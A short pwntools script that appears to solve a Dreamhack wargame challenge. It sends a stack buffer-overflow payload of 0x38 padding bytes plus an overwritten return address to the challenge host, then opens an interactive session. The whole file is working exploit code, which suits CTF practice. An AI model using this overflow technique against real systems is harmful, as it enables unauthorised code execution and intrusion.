from pwn import *

p = remote('host3.dreamhack.games',19425)

payload = b'\x90'*0x38 + b'\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)

p.interactive()